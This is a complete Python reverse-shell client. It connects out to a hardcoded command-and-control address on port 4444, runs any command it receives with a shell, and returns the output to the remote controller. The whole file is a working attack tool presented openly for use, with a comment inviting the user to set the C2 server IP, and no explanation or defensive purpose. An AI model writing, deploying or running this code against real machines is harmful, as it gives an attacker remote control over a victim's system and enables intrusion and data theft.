# Client (reverse shell)
import socket
import subprocess

SERVER_HOST = '10.0.2.15'  # Change to the C2 server IP
SERVER_PORT = 4444

BUFFER_SIZE = 1024

def connect_to_server():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client:
        try:
            client.connect((SERVER_HOST, SERVER_PORT))
            client.send(b"Shell connected.\n")
            while True:
                command = client.recv(BUFFER_SIZE).decode(errors='ignore').strip()
                if not command:
                    break
                if command.startswith("cmd:"):
                    command_to_run = command[4:].strip()
                    if command_to_run.lower() in ['exit', 'quit']:
                        break
                    try:
                        output = subprocess.check_output(command_to_run, shell=True, stderr=subprocess.STDOUT)
                    except subprocess.CalledProcessError as e:
                        output = e.output
                    client.send(output + b"\n" if output else b"Command executed with no output.\n")
        except ConnectionError:
            print("[-] Connection to server failed.")

if __name__ == "__main__":
    connect_to_server()

